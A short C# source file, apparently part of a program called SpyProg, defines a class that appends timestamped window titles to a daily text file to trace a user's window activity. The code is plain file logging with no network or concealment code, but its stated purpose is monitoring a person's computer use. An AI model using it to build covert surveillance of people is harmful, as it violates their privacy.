using System;
using System.IO;

namespace SpyProg.Loggers {
    //logger for tracing all user's window activity
    class DaySpyLogger {
        private string daySpyFile;

        public DaySpyLogger() {
            NewDay();
        }

        public void NewDay() {
            daySpyFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"daySpyFile({DateTime.Now.ToString("dd-MM-yyyy")}).txt");
        }

        public void Log(string windowName) {
            using (StreamWriter sw = File.AppendText(daySpyFile)) {
                sw.WriteLine($"{DateTime.Now.ToString("HH:mm:ss")} - {windowName}");
            }
        }
    }
}
